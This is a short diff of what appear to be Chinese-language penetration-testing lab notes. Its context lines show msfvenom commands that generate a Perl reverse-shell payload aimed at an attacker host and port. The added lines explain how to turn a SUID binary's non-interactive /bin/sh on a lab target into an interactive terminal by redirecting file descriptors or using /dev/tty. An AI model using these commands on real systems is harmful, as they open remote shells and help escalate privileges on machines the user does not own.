@@ -39,4 +39,25 @@ msfvenom -p cmd/unix/reverse_perl LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw
 msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.100 LPORT=4444 -f raw
 
 
+靶机中给出了一个suid文件，他可以执行/bin/sh，但返回的是一个非交互式的终端，此时如何使其返回交互终端：
+方法 1：0<&1 1>&0 2>&0
+
+./suid_shell 0<&1 1>&0 2>&0
+
+    0<&1：把标准输入（fd 0）指向当前的标准输出（fd 1，也就是你的终端）。
+
+    1>&0：把标准输出（fd 1）指向标准输入（fd 0）。
+
+    2>&0：把标准错误（fd 2）也指向标准输入（fd 0）。
+
+合在一起，就是让子进程的所有输入输出都回到你当前的终端。
+方法 2：直接指向 /dev/tty
+
+./suid_shell < /dev/tty > /dev/tty 2>&1
+
+    < /dev/tty：用你的终端做 stdin。
+
+    > /dev/tty：用你的终端做 stdout。
+
+    2>&1：stderr 重定向到 stdout。
  
